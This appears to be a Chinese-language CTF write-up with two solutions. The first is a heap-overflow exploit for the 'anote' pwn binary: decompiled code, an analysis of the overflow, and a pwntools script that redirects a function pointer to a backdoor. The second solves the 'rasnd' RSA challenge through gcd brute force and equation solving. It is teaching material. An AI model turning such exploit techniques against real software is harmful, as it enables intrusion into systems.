### anote

拿到题目,checksec发现没开PIE

```assembly
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

进入程序,发现它提供了一个功能菜单:

```
1. add
2. show content
3. edit content
4. exit
Choice>>
```

那么我们进入IDA,找到`main`函数

```c
int __cdecl main(int a1)
{
  int v1; // ebx
  unsigned int i; // eax
  int v3; // eax
  int v4; // eax
  int chunk_text_start; // ebx
  int gift_str; // eax
  int v7; // eax
  std::istream *v8; // eax
  int v9; // eax
  std::istream *v10; // eax
  int index; // [esp+0h] [ebp-68h] BYREF
  size_t n; // [esp+4h] [ebp-64h] BYREF
  int caozuo; // [esp+8h] [ebp-60h] BYREF
  int num_of_chunk; // [esp+Ch] [ebp-5Ch]
  int v16; // [esp+10h] [ebp-58h]
  int chunk_list[10]; // [esp+14h] [ebp-54h]
  char src[32]; // [esp+3Ch] [ebp-2Ch] BYREF
  unsigned int v19; // [esp+5Ch] [ebp-Ch]
  int *v20; // [esp+60h] [ebp-8h]

  v20 = &a1;
  v19 = __readgsdword(0x14u);
  num_of_chunk = 0;
  v16 = 10;
  while ( 1 )
  {
    sub_804895C();
    if ( num_of_chunk > 9 )
      break;
    std::istream::operator>>(&std::cin, &caozuo);
    if ( caozuo == 2 )
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "index: ");
      std::istream::operator>>(&std::cin, &index);
      if ( index >= num_of_chunk )
      {
        v4 = std::operator<<<std::char_traits<char>>(&std::cout, "the item does not exist.");
        std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
        exit(0);
      }
      chunk_text_start = chunk_list[index];
      gift_str = std::operator<<<std::char_traits<char>>(&std::cout, "gift: ");
      v7 = std::ostream::operator<<(gift_str, chunk_text_start);
      std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
      show_chunk(chunk_list[index]);
    }
    else if ( caozuo == 3 )
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "index: ");
      v8 = (std::istream *)std::istream::operator>>(&std::cin, &index);
      std::istream::get(v8);
      if ( index >= num_of_chunk )
      {
        v9 = std::operator<<<std::char_traits<char>>(&std::cout, "the item does not exist.");
        std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
        exit(0);
      }
      std::operator<<<std::char_traits<char>>(&std::cout, "len: ");
      v10 = (std::istream *)std::istream::operator>>(&std::cin, &n);
      std::istream::get(v10);
      if ( (int)n > 40 )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "too big!\n");
        exit(0);
      }
      std::operator<<<std::char_traits<char>>(&std::cout, "content: ");
      std::istream::getline((std::istream *)&std::cin, src, 32);
      sub_8048A86(chunk_list[index], src, index, n);
      (**(void (__cdecl ***)(int))chunk_list[index])(chunk_list[index]);
    }
    else
    {
      if ( caozuo != 1 )
        exit(0);
      v1 = operator new(0x1Cu);
      for ( i = 0; i < 0x1C; i += 4 )
        *(_DWORD *)(v1 + i) = 0;
      sub_8048DFC(v1);
      v3 = num_of_chunk++;
      chunk_list[v3] = v1;
      std::operator<<<std::char_traits<char>>(&std::cout, "got new one!\n");
    }
  }
  std::operator<<<std::char_traits<char>>(&std::cout, "too much!!!\n");
  return 0;
}
```

可以看到`main`函数看上去相当乱,不过在我们根据菜单和一点点的猜测把函数和变量重命名之后,还是能够理解程序的执行过程的.

程序主要的漏洞点在edit,程序申请的chunk只有0x20大,其中0x10还要给pre_size,size,和程序自己保留的0x8,因此留给我们输入的文本的实际空间只有0x10.而程序却允许我们写入0x28(40)的内容.我们只需将chunk中指向`0x08048F48`的指针改为指向一个存有后门函数的地址即可.而由于程序在show时会赠送给我们chunk的地址,因此我们可以直接将后门函数的地址放在前面的填充数据中.

最终编写脚本如下:

```python
from pwn import *

r=process("./pwn")
#r=remote("60.205.186.205",28913)

backdoor_add=0x080489CE
#gdb.attach(r)
#pause()
r.sendline("1")
r.sendline("1")
r.sendline("2")
r.sendline("0")
r.recvuntil("gift: ")
gift_add=int(r.recv(9),16)
print(hex(gift_add))
r.sendline("3")
r.sendline("0")
r.sendline("29")
payload1=p32(backdoor_add)+b'a'*12+b'\x00'*4+b'\x21'+b'\x00'*3+p32(gift_add+0x8)

r.sendline(payload1)
r.sendline("3")
r.sendline("1")
r.sendline("10")
#pause()
r.sendline("a")

r.interactive()
```

### rasnd

题目脚本如下:

```python
from Crypto.Util.number import getPrime, bytes_to_long
from random import randint
import os

FLAG = os.getenv("FLAG").encode()
flag1 = FLAG[:15]
flag2 = FLAG[15:]

def crypto1():
    p = getPrime(1024)
    q = getPrime(1024)
    n = p * q
    e = 0x10001
    x1=randint(0,2**11)
    y1=randint(0,2**114)
    x2=randint(0,2**11)
    y2=randint(0,2**514)
    hint1=x1*p+y1*q-0x114
    hint2=x2*p+y2*q-0x514
    c = pow(bytes_to_long(flag1), e, n)
    print(n)
    print(c)
    print(hint1)
    print(hint2)


def crypto2():
    p = getPrime(1024)
    q = getPrime(1024)
    n = p * q
    e = 0x10001
    hint = pow(514*p - 114*q, n - p - q, n) #phi=n-p-q+1 pow(514*p-114*q,phi,n)==1 hint*(514*p-114*q) %n==1
    #d=phi-1
    c = pow(bytes_to_long(flag2),e,n)
    print(n)
    print(c)
    print(hint)
print("==================================================================")
crypto1()
print("==================================================================")
crypto2()
print("==================================================================")

```

可以看到flag分为两部分.第一部分通过穷举较小的x1和x2,爆破出p

```python
n1=12981940682778492361076535991242294848940960537844711255063900262577418213382106814184626030191794644058966209986820921954041635951754788820067778993987549385288605371860313154661810203236501541743353517087782891899080224288807279868020496658195690937282052286954948139003378426672685358230692696553073471240183543853360198890003773075941654024211793199050060516080834016873206867234056831632087915210009965547713489261143099621766654560466523326010779039283325267127450033836067732122425497398334976157970568370040257727302364701329173299051096133188769640112997063964804140131653095727705596483928607290253045892351
c1=3800862644220243191032272924502575446731146879776810580159523668606311820076795853768133360461541679772603908394808588828474493185164060008649733095505005733220989839109584982392725913235954505178615308599673502531261965781007135199554026228447794204658206728702505030456278947479272287589143688562269966110216528297652472816004723489137487818206169373064352796426923948910449734805435146845711518556423966245335765952831352596326454179344112191062726333482082961692441167577511487066680548301811440273951353504449536446877943182614220195420803092197898210379661044647002607164228250110894622691988814457276052261252
hint1=208568690028063874962239927214841510951387758426883838773623947503021877328076314341937955190523206763260982438464323611351791353722441302997724527112054343436066456739077067075274948280111422737775144752499971949140972731494740536552038386579847286116244533742578787033834223906096764894177488642417011804213144646518525010743710727216710255+0x114
hint2=4005760734337575643123036048436288141960805210562663601740285262466443356562492446924269620046650028323023519075493658561048362679988822613650309817875350367679695771723040017922275072052086401562516256848199242684061900395480825994658265923505638927861068064577362182407356145704671921797674590437971942838282018856316282023973716969801647052129794786516960199663760310337922264437275950066309069699910794171325306361716405336664699549571946678528260553878714303+0x514

for i in range(0,2049):
    print("i=",i)
    for j in range(0,2049):
        q=gcd(abs(hint1*j-hint2*i),n1)
        if q!=1:
            print("q=",q)
```

第二部分通过`inverse()`求出pow之前的`514*p - 114*q`,再用sagemath的解方程求出p和q.

```
_hint=66917704400841981214567193090400289861784082643886085510481712901399603588968910711168591883913599971320562301025655891641196929659166433670687845667618177299600169428829613963645374124493682724845877884593403983265408074155001539810693282783482129785630273589952759713403798702897984826806320988146515722643856
n2=26304799136259509054847505663384040119481205792069441239650068541242575164164503950668516357375122055416578697523229540968589819773287747648084417839154991457949875414883112855627775523250261273142786919059045725824332185961984097676753966393954670228270986389569518758998936471253539673118364633342570891748722128872764735791340417054584187905536206938487727726855544778496947229055506166288994873966239327086562635350749297903280868933753636026063047563243136879224923828326454094426130467030806335277553566609872232155210272418986674314935967514868259993650644734904025785142421888716404196184333271051411579195777
c2=4933324017267207034607125147983916876101363125813619347847026381298586411753526113737784208823945757511624010816244427992701188312505969254567590054823267909486548684705024750318141970279165649933022512458670722875968846945296524184144240978349090077405530174839926883987828456941919463278632270326889164199060460755729913503456202084947085276642675038295384960180233399871452951778583017143595351414964901489034777104622217621984795785973973088428389353758639836495125426380598612852050615519987874180525483158031600795905619346460351667864929937689097481999270790115529469180115242624028712299272637729007575132254
p=var('p')
q=var('q')
print(solve([514*p - 114*q==_hint,p*q==n2],p,q))
print(1)

```

最终求出d1,d2,得到前后两段flag.

```python
from Crypto.Util.number import *
e = 0x10001


n1=12981940682778492361076535991242294848940960537844711255063900262577418213382106814184626030191794644058966209986820921954041635951754788820067778993987549385288605371860313154661810203236501541743353517087782891899080224288807279868020496658195690937282052286954948139003378426672685358230692696553073471240183543853360198890003773075941654024211793199050060516080834016873206867234056831632087915210009965547713489261143099621766654560466523326010779039283325267127450033836067732122425497398334976157970568370040257727302364701329173299051096133188769640112997063964804140131653095727705596483928607290253045892351
c1=3800862644220243191032272924502575446731146879776810580159523668606311820076795853768133360461541679772603908394808588828474493185164060008649733095505005733220989839109584982392725913235954505178615308599673502531261965781007135199554026228447794204658206728702505030456278947479272287589143688562269966110216528297652472816004723489137487818206169373064352796426923948910449734805435146845711518556423966245335765952831352596326454179344112191062726333482082961692441167577511487066680548301811440273951353504449536446877943182614220195420803092197898210379661044647002607164228250110894622691988814457276052261252
hint1=208568690028063874962239927214841510951387758426883838773623947503021877328076314341937955190523206763260982438464323611351791353722441302997724527112054343436066456739077067075274948280111422737775144752499971949140972731494740536552038386579847286116244533742578787033834223906096764894177488642417011804213144646518525010743710727216710255
hint2=4005760734337575643123036048436288141960805210562663601740285262466443356562492446924269620046650028323023519075493658561048362679988822613650309817875350367679695771723040017922275072052086401562516256848199242684061900395480825994658265923505638927861068064577362182407356145704671921797674590437971942838282018856316282023973716969801647052129794786516960199663760310337922264437275950066309069699910794171325306361716405336664699549571946678528260553878714303
q1=91783416149783182771320382589642742695700885107308113623702373236254683489276134966716955971822602030166183465815349985640870671644246424549204138010154923870251788834154723112876071532757725346533869104187702720885056616146917059004736089101150236511861693306764951135198383107537955649298477623389582429433
p1=n1//q1
n2=26304799136259509054847505663384040119481205792069441239650068541242575164164503950668516357375122055416578697523229540968589819773287747648084417839154991457949875414883112855627775523250261273142786919059045725824332185961984097676753966393954670228270986389569518758998936471253539673118364633342570891748722128872764735791340417054584187905536206938487727726855544778496947229055506166288994873966239327086562635350749297903280868933753636026063047563243136879224923828326454094426130467030806335277553566609872232155210272418986674314935967514868259993650644734904025785142421888716404196184333271051411579195777
c2=4933324017267207034607125147983916876101363125813619347847026381298586411753526113737784208823945757511624010816244427992701188312505969254567590054823267909486548684705024750318141970279165649933022512458670722875968846945296524184144240978349090077405530174839926883987828456941919463278632270326889164199060460755729913503456202084947085276642675038295384960180233399871452951778583017143595351414964901489034777104622217621984795785973973088428389353758639836495125426380598612852050615519987874180525483158031600795905619346460351667864929937689097481999270790115529469180115242624028712299272637729007575132254
hint=21386134136289377236028248620909876420269643494000074289045801613925009562334916517119579131300740944456744345083855405054025723261587041392432799582953518925185408379967656866427352833702711095807570606082478761317930288629308103227495080907181330111589739214140378847978159372103040752649308593923122968974605521352113595258511061226168519687063478279790000665370085689586854684618662218863468987733471670119296522303521633334489353171224461824311621641993527694764692010289122544123052338347897118322437300368146357293271864708675919739836664442542805404982696265226411231569993427977419579827453215507065850861393

p2 = 165451921271324116208666025859252249356184678685976948408678225187214255227533870303700688496830448941565392663777247405238192666216333327337835018875090769225775684205493868759675736590123814488277302660379904389978383025664461414787593838995166406507487294884549787223019882593846138539939726776478441185543
q2 =158987571338759776462167931589959353572761773690404087469990305656390557877048233552048789504010971795123241475051309426765211410316042952464555737141916474407443265375388022621297846340613665983584698972297077834942814044180101994650262723333626343501913999830752902800249306581920441953707882236521079357239

phi2=(p2-1)*(q2-1)
d2=inverse(e,phi2)
m2=pow(c2,d2,n2)

print(p1*q1==n1)
#print(p1)

phi=(p1-1)*(q1-1)
d1=inverse(e,phi)
m1=pow(c1,d1,n1)
print(long_to_bytes(m1),end='')

print(long_to_bytes(m2))
```

